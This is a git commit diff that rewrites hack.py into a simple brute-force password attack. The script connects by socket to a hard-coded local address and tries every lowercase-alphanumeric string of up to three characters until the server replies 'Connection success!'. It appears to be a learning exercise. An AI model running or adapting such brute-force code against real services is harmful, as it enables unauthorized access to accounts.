fa0815cfdbb2bc0544ca90ed6a9654e6057d1a8f
Pawel <pjuszcze@gmail.com>
2021-02-21 00:49:48 +0100

    Added: server attack by a password generator

--- hack.py
+++ hack.py
@@ -1,18 +1,37 @@
 import sys
 import socket
-"""Args: Host, port, message"""
+import itertools
+import string
+
+"""Args: Host, port"""
 
 socket_1 = socket.socket()
-address = (sys.argv[1], int(sys.argv[2]))
+# address = (sys.argv[1], int(sys.argv[2]))
+address = ("192.168.0.102", 9090)
+
+alphabet = list(string.ascii_lowercase)
+nums = list(string.digits)
+all_char = list(itertools.chain(nums, alphabet))
 
 socket_1.connect(address)
-data = sys.argv[3].encode()
-socket_1.send(data)
-print("Send:", data)
+while True:
+    for _ in range(1, 4):
+        prods = itertools.product(all_char, repeat=_)
 
-response = socket_1.recv(1024)
-print("Response: ", response.decode())
+        while True:
+            try:
+                a = next(prods)
+            except StopIteration:
+                break
+            else:
+                a = "".join(a)
+                socket_1.send(a.encode())
+                response = socket_1.recv(1024)
+                if response.decode() == "Connection success!":
+                    print("Password was hacked:", a)
+                    break
+        
+    break
+
 
 socket_1.close()
-
-# python hack.py 192.168.0.102 9090 qwerty
